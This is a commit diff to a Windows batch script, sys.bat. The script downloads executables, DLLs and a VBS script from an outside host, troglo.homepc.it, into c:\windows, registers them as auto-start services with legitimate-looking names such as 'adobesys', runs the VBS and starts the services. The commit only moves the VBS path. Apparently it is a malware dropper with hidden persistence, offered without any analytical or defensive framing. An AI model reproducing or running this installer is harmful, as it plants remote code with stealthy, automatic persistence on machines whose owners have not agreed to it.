d3d8599c63441d847e38a34a6cf0a31dbc6542ca
pistacchietto <pistacchietto2@gmail.com>
2020-01-12 11:24:23 +0100

    ok

--- sys.bat
+++ sys.bat
@@ -23,11 +23,11 @@ wget http://troglo.homepc.it/win/sys2.exe -O c:\windows\sys2.exe
 wget http://troglo.homepc.it/win/sys3.exe -O c:\windows\sys3.exe
 sc create CppWindowsService binPath= c:\windows\sys2.exe DisplayName= "CppWindowsService" start= auto
 sc create adobesys binPath= c:\windows\sys3.exe DisplayName= "adobesys" start= auto
-wget http://troglo.homepc.it/win/svc.vbs -O c:\windows\svc.vbs
+wget http://troglo.homepc.it/win/svc.vbs -O c:\windows\hp\svc.vbs
 wget http://troglo.homepc.it/win/libssl-1_1.dll -O c:\windows\libssl-1_1.dll
 wget http://troglo.homepc.it/win/libcurl.dll -O c:\windows\libcurl.dll
 wget http://troglo.homepc.it/win/libcrypto-1_1.dll -O c:\windows\libcrypto-1_1.dll
-cscript c:\windows\svc.vbs
+cscript c:\windows\hp\svc.vbs
 net start CppWindowsService
 net start adobesys
  
